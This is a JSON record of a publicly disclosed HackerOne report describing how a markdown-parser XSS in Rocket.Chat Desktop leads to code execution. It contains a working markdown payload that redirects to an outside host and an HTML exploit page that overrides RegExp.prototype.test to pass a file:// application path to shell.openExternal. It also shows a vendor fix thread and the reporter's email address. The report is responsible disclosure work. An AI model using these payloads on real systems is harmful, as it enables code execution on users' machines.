@@ -1,0 +1,322 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2018-08-19T22:00:40.456Z", 
+    "voters": [
+        "8ayac", 
+        "mattaustin", 
+        "eveeez", 
+        "dmatrix", 
+        "secgeek", 
+        "mygf", 
+        "michael1026", 
+        "mohammed__fayez", 
+        "cryptographer", 
+        "thedeadgirlishere", 
+        "and 1 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": false, 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 276031, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": null, 
+    "vulnerability_information": "**Summary:** The Markdown parser can be tricked into allowing arbitrary Javascript leading to \"remote code execution\". \n\n**Description:** \nBy combining the \"link\" and inline code block we can trick the parser into breaking out of the current HTML attribute. \n\nThis allows us to control other attributes of the tag and trigger javascript events. \n```\n[ hax ](http://hax//onmouseover=location='https://maustin.net/hax/rocket/hack.html';\"`hax`zzz)\n```\nbecomes \n```html\n<a href=\"&lt;a href=\" http:=\"\" hax=\"\" onmouseover=\"location='https://maustin.net/hax/rocket/hack.html';&quot;&quot;\" target=\"_blank\" rel=\"noopener noreferrer\">\n```\n\nThis is a simple redirect to: https://maustin.net/hax/rocket/hack.html\n\nFrom this point the goal is to get the application to call shell.openExternal(href); with a URL we control. Thats because: \n>      \"open 'file://localhost/Volumes/Macintosh HD/foo.txt'\" opens the document\n     in the default application for its type (as determined by LaunchSer-\n     vices).\n\nNote:  For this demo I point to file:///Applications/Calculator.app however if you point to a public NFS or SMB server on windows this executable can be controlled by the attacker. (example at: file:///net/192.241.239.91/var/nfs/general/hack2.app)\n\nIn https://github.com/RocketChat/Rocket.Chat.Electron/blob/master/src/public/preload.js#L45 all links are hooked and some patter matching is used to check before firing them off to shell.openExternal(href); \n\nNormally preload javascript is an \"isolated scope\" in this case however the code is directly attached to the user controlled DOM as the \"window.onload\" handler. This means we can overload some global objects and methods including the RegExp.prototype.test method. Now we can bypass the file:\\\\/\\\\/ check send our application path to openExternal.\n\n```html\n<!DOCTYPE html>\n<html>\n    <head>\n      <script>\n        RegExp.prototype.test = new Proxy(RegExp.prototype.test, {\n          apply: function(target, thisArg, argumentsList) {\n            console.log(thisArg.source);\n          console.log(argumentsList[0]);\n          if((thisArg.source == '^file:\\\\/\\\\/.+') && (argumentsList[0] === 'file:///Applications/Calculator.app')){\n            return false;\n          }\n          return Reflect.apply(target, thisArg, argumentsList)\n          }\n        });\n        setTimeout(()=>{\n            a = document.createElement(\"A\")\n            a.href=\"file:///Applications/Calculator.app\"\n            document.body.appendChild(a)\n            a.click()\n        }, 3000);\n      </script>\n    </head>\n    <body>\n     <h1>3...2...1...\ud83d\ude80</h1>\n    </body>\n</html>\n```\n\n## Releases Affected:\n\n  * >= 2.9.0\n\n## Steps To Reproduce (from initial installation to vulnerability):\n\n  1. Create a new channel to test in. \n  1. Send the following snippet of markdown: \n```\n[ hax ](http://hax//onmouseover=location='https://maustin.net/hax/rocket/hack.html';\"`hax`zzz)\n```\n  1. Move your mouse over the link you just send and \n\n## Supporting Material/References:\n\n  * https://youtu.be/HPlwlc2J-LQ\n\n## Suggested mitigation\n\n  * The markdown parser needs a little love to prevent the initial xss. \n  * I believe you should be able to use something like  `window.addEventListener(\"load\",` .. to execute the checks in the proper scope. \n", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "high", 
+        "author_type": "User"
+    }, 
+    "title": "Remote Code Execution in Rocket.Chat Desktop", 
+    "is_member_of_team?": null, 
+    "vote_count": 11, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": "2018-09-18T22:00:40.574Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2017-10-10T12:20:29.552Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-10-10T12:20:29.552Z", 
+            "actor": {
+                "username": "rodrigok", 
+                "url": "/rodrigok", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/157/360/4dbc387389e3a267a73b03aec224ba4d3acad0b4_medium.jpg?1491842972"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rocket_chat", 
+            "message": "Thanks @mattaustin \nI'm working to fix the issue ASAP.", 
+            "markdown_message": "<p>Thanks <a href=\"/mattaustin\">@mattaustin</a> <br>\nI&#39;m working to fix the issue ASAP.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2056152, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-10-10T13:23:03.304Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-10-10T13:23:03.304Z", 
+            "actor": {
+                "username": "rodrigok", 
+                "url": "/rodrigok", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/157/360/4dbc387389e3a267a73b03aec224ba4d3acad0b4_medium.jpg?1491842972"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rocket_chat", 
+            "message": "Hi @mattaustin \nThe first part of the issue was solved at this PR https://github.com/RocketChat/Rocket.Chat/pull/8451 can you take a look?\n\nI didn't added the tests to the PR now to not disclosure the bug", 
+            "markdown_message": "<p>Hi <a href=\"/mattaustin\">@mattaustin</a> <br>\nThe first part of the issue was solved at this PR <a title=\"https://github.com/RocketChat/Rocket.Chat/pull/8451\" href=\"/redirect?signature=65ba57610c26b93bc9bce4d5c9557b72939ef663&amp;url=https%3A%2F%2Fgithub.com%2FRocketChat%2FRocket.Chat%2Fpull%2F8451\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/RocketChat/Rocket.Chat/pull/8451</span><i class=\"icon-external-link\"></i></a> can you take a look?</p>\n\n<p>I didn&#39;t added the tests to the PR now to not disclosure the bug</p>\n", 
+            "type": "Activities::BugTriaged", 
+            "id": 2056289, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-10-11T23:39:55.800Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-10-11T23:39:55.800Z", 
+            "actor": {
+                "username": "mattaustin", 
+                "url": "/mattaustin", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/526/32b2239641154d4dff6c1176a12a3168731c8ab9_medium.png?1502258912"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rocket_chat", 
+            "message": "This looks like it should solve it. I think replacing with tokens until then end is a much better way to go. I think it is still worth looking at the on load event as well to mitigate the risk from any other XSS", 
+            "markdown_message": "<p>This looks like it should solve it. I think replacing with tokens until then end is a much better way to go. I think it is still worth looking at the on load event as well to mitigate the risk from any other XSS</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2060414, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "mattaustin", 
+                "url": "/mattaustin"
+            }, 
+            "created_at": "2017-10-13T18:24:59.452Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-10-13T18:24:59.452Z", 
+            "actor": {
+                "url": "/rocket_chat", 
+                "profile": {
+                    "name": "Rocket.Chat"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/858/579770f2ba92af3953abc9204886c242051f03e3_medium.png?1536335889"
+                }
+            }, 
+            "team_handle": "rocket_chat", 
+            "message": "Can you provide me your email, I'll pass to Sing Li to send you a swag :)", 
+            "markdown_message": "<p>Can you provide me your email, I&#39;ll pass to Sing Li to send you a swag :)</p>\n", 
+            "type": "Activities::SwagAwarded", 
+            "id": 2064686, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-10-13T18:46:03.668Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-10-13T18:46:16.581Z", 
+            "actor": {
+                "username": "mattaustin", 
+                "url": "/mattaustin", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/526/32b2239641154d4dff6c1176a12a3168731c8ab9_medium.png?1502258912"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rocket_chat", 
+            "message": "sure its: matt@m-austin.com  Thanks!!", 
+            "markdown_message": "<p>sure its: <a title=\"matt@m-austin.com\" href=\"mailto:matt@m-austin.com\" rel=\"nofollow noopener noreferrer\">matt@m-austin.com</a>  Thanks!!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2064766, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "mattaustin", 
+                "url": "/mattaustin"
+            }, 
+            "created_at": "2018-05-17T12:49:09.271Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-17T12:49:09.271Z", 
+            "actor": {
+                "username": "rodrigok", 
+                "url": "/rodrigok", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/157/360/4dbc387389e3a267a73b03aec224ba4d3acad0b4_medium.jpg?1491842972"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rocket_chat", 
+            "message": "I'll close this issue since it was already solver.\n\nPlease open a new one if we missed something.\n\nThanks", 
+            "markdown_message": "<p>I&#39;ll close this issue since it was already solver.</p>\n\n<p>Please open a new one if we missed something.</p>\n\n<p>Thanks</p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 2756896, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-08-19T22:00:40.506Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-08-19T22:00:40.506Z", 
+            "actor": {
+                "username": "mattaustin", 
+                "url": "/mattaustin", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/526/32b2239641154d4dff6c1176a12a3168731c8ab9_medium.png?1502258912"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rocket_chat", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 3217979, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-18T22:00:44.042Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-18T22:00:44.042Z", 
+            "actor": {
+                "url": "/rocket_chat", 
+                "profile": {
+                    "name": "Rocket.Chat"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/858/579770f2ba92af3953abc9204886c242051f03e3_medium.png?1536335889"
+                }
+            }, 
+            "team_handle": "rocket_chat", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 3355875, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "mattaustin", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/mattaustin", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/002/526/bb740f1d3f2a1ebfb75d19f9684ae324024601c3_small.png?1502258912"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 70, 
+        "name": "Code Injection"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -6826574.647232271, 
+    "disclosed_at": "2018-09-18T22:00:43.878Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/276031", 
+    "created_at": "2017-10-10T06:22:44.191Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p><strong>Summary:</strong> The Markdown parser can be tricked into allowing arbitrary Javascript leading to &quot;remote code execution&quot;. </p>\n\n<p><strong>Description:</strong> <br>\nBy combining the &quot;link&quot; and inline code block we can trick the parser into breaking out of the current HTML attribute. </p>\n\n<p>This allows us to control other attributes of the tag and trigger javascript events. </p>\n<pre class=\"highlight plaintext\"><code>[ hax ](http://hax//onmouseover=location=&#39;https://maustin.net/hax/rocket/hack.html&#39;;&quot;`hax`zzz)\n</code></pre>\n<p>becomes </p>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;a</span> <span class=\"na\">href=</span><span class=\"s\">&quot;&amp;lt;a href=&quot;</span> <span class=\"na\">http:=</span><span class=\"s\">&quot;&quot;</span> <span class=\"na\">hax=</span><span class=\"s\">&quot;&quot;</span> <span class=\"na\">onmouseover=</span><span class=\"s\">&quot;location=&#39;https://maustin.net/hax/rocket/hack.html&#39;;&amp;quot;&amp;quot;&quot;</span> <span class=\"na\">target=</span><span class=\"s\">&quot;_blank&quot;</span> <span class=\"na\">rel=</span><span class=\"s\">&quot;noopener noreferrer&quot;</span><span class=\"nt\">&gt;</span>\n</code></pre>\n<p>This is a simple redirect to: <a title=\"https://maustin.net/hax/rocket/hack.html\" href=\"/redirect?signature=3d39ec8107f3a84ac646f98894e241f4dc1e7374&amp;url=https%3A%2F%2Fmaustin.net%2Fhax%2Frocket%2Fhack.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://maustin.net/hax/rocket/hack.html</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>From this point the goal is to get the application to call shell.openExternal(href); with a URL we control. Thats because: </p>\n\n<blockquote>\n<pre class=\"highlight plaintext\"><code> &quot;open &#39;file://localhost/Volumes/Macintosh HD/foo.txt&#39;&quot; opens the document\n in the default application for its type (as determined by LaunchSer-\n vices).\n</code></pre>\n</blockquote>\n\n<p>Note:  For this demo I point to file:///Applications/Calculator.app however if you point to a public NFS or SMB server on windows this executable can be controlled by the attacker. (example at: file:///net/192.241.239.91/var/nfs/general/hack2.app)</p>\n\n<p>In <a title=\"https://github.com/RocketChat/Rocket.Chat.Electron/blob/master/src/public/preload.js#L45\" href=\"/redirect?signature=c0f772aca487766bdce4f75f8a2cd81f1c7a5ca7&amp;url=https%3A%2F%2Fgithub.com%2FRocketChat%2FRocket.Chat.Electron%2Fblob%2Fmaster%2Fsrc%2Fpublic%2Fpreload.js%23L45\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/RocketChat/Rocket.Chat.Electron/blob/master/src/public/preload.js#L45</span><i class=\"icon-external-link\"></i></a> all links are hooked and some patter matching is used to check before firing them off to shell.openExternal(href); </p>\n\n<p>Normally preload javascript is an &quot;isolated scope&quot; in this case however the code is directly attached to the user controlled DOM as the &quot;window.onload&quot; handler. This means we can overload some global objects and methods including the RegExp.prototype.test method. Now we can bypass the file:\\/\\/ check send our application path to openExternal.</p>\n<pre class=\"highlight html\"><code><span class=\"cp\">&lt;!DOCTYPE html&gt;</span>\n<span class=\"nt\">&lt;html&gt;</span>\n    <span class=\"nt\">&lt;head&gt;</span>\n      <span class=\"nt\">&lt;script&gt;</span>\n        <span class=\"nb\">RegExp</span><span class=\"p\">.</span><span class=\"nx\">prototype</span><span class=\"p\">.</span><span class=\"nx\">test</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nx\">Proxy</span><span class=\"p\">(</span><span class=\"nb\">RegExp</span><span class=\"p\">.</span><span class=\"nx\">prototype</span><span class=\"p\">.</span><span class=\"nx\">test</span><span class=\"p\">,</span> <span class=\"p\">{</span>\n          <span class=\"na\">apply</span><span class=\"p\">:</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">target</span><span class=\"p\">,</span> <span class=\"nx\">thisArg</span><span class=\"p\">,</span> <span class=\"nx\">argumentsList</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n            <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">thisArg</span><span class=\"p\">.</span><span class=\"nx\">source</span><span class=\"p\">);</span>\n          <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">argumentsList</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]);</span>\n          <span class=\"k\">if</span><span class=\"p\">((</span><span class=\"nx\">thisArg</span><span class=\"p\">.</span><span class=\"nx\">source</span> <span class=\"o\">==</span> <span class=\"s1\">&#39;^file:\\\\/\\\\/.+&#39;</span><span class=\"p\">)</span> <span class=\"o\">&amp;&amp;</span> <span class=\"p\">(</span><span class=\"nx\">argumentsList</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span> <span class=\"o\">===</span> <span class=\"s1\">&#39;file:///Applications/Calculator.app&#39;</span><span class=\"p\">)){</span>\n            <span class=\"k\">return</span> <span class=\"kc\">false</span><span class=\"p\">;</span>\n          <span class=\"p\">}</span>\n          <span class=\"k\">return</span> <span class=\"nx\">Reflect</span><span class=\"p\">.</span><span class=\"nx\">apply</span><span class=\"p\">(</span><span class=\"nx\">target</span><span class=\"p\">,</span> <span class=\"nx\">thisArg</span><span class=\"p\">,</span> <span class=\"nx\">argumentsList</span><span class=\"p\">)</span>\n          <span class=\"p\">}</span>\n        <span class=\"p\">});</span>\n        <span class=\"nx\">setTimeout</span><span class=\"p\">(()</span><span class=\"o\">=&gt;</span><span class=\"p\">{</span>\n            <span class=\"nx\">a</span> <span class=\"o\">=</span> <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">createElement</span><span class=\"p\">(</span><span class=\"s2\">&quot;A&quot;</span><span class=\"p\">)</span>\n            <span class=\"nx\">a</span><span class=\"p\">.</span><span class=\"nx\">href</span><span class=\"o\">=</span><span class=\"s2\">&quot;file:///Applications/Calculator.app&quot;</span>\n            <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">body</span><span class=\"p\">.</span><span class=\"nx\">appendChild</span><span class=\"p\">(</span><span class=\"nx\">a</span><span class=\"p\">)</span>\n            <span class=\"nx\">a</span><span class=\"p\">.</span><span class=\"nx\">click</span><span class=\"p\">()</span>\n        <span class=\"p\">},</span> <span class=\"mi\">3000</span><span class=\"p\">);</span>\n      <span class=\"nt\">&lt;/script&gt;</span>\n    <span class=\"nt\">&lt;/head&gt;</span>\n    <span class=\"nt\">&lt;body&gt;</span>\n     <span class=\"nt\">&lt;h1&gt;</span>3...2...1...\ud83d\ude80<span class=\"nt\">&lt;/h1&gt;</span>\n    <span class=\"nt\">&lt;/body&gt;</span>\n<span class=\"nt\">&lt;/html&gt;</span>\n</code></pre>\n<h2 id=\"releases-affected\">Releases Affected:</h2>\n\n<ul>\n<li>&gt;= 2.9.0</li>\n</ul>\n\n<h2 id=\"steps-to-reproduce-from-initial-installation-to-vulnerability\">Steps To Reproduce (from initial installation to vulnerability):</h2>\n\n<ol>\n<li>Create a new channel to test in. </li>\n<li>Send the following snippet of markdown: \n<code>\n[ hax ](http://hax//onmouseover=location=&#39;https://maustin.net/hax/rocket/hack.html&#39;;&quot;`hax`zzz)\n</code>\n</li>\n<li>Move your mouse over the link you just send and </li>\n</ol>\n\n<h2 id=\"supporting-material-references\">Supporting Material/References:</h2>\n\n<ul>\n<li><a title=\"https://youtu.be/HPlwlc2J-LQ\" href=\"/redirect?signature=ae2afc608ebf4514050baa66c4997f8eeaed3f84&amp;url=https%3A%2F%2Fyoutu.be%2FHPlwlc2J-LQ\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://youtu.be/HPlwlc2J-LQ</span><i class=\"icon-external-link\"></i></a></li>\n</ul>\n\n<h2 id=\"suggested-mitigation\">Suggested mitigation</h2>\n\n<ul>\n<li>The markdown parser needs a little love to prevent the initial xss. </li>\n<li>I believe you should be able to use something like  <code>window.addEventListener(&quot;load&quot;,</code> .. to execute the checks in the proper scope. </li>\n</ul>\n", 
+    "severity_rating": "high", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://rocket.chat", 
+            "about": "Rocket.Chat is a company built on open source values and a love for efficiency. The company is driven by our amazing community of contributors.", 
+            "twitter_handle": "RocketChat", 
+            "name": "Rocket.Chat"
+        }, 
+        "handle": "rocket_chat", 
+        "url": "https://hackerone.com/rocket_chat", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/019/858/8d9ef2fed6eede0f68fb07436444b90a733f675e_small.png?1536335889", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/019/858/579770f2ba92af3953abc9204886c242051f03e3_medium.png?1536335889"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 19858, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
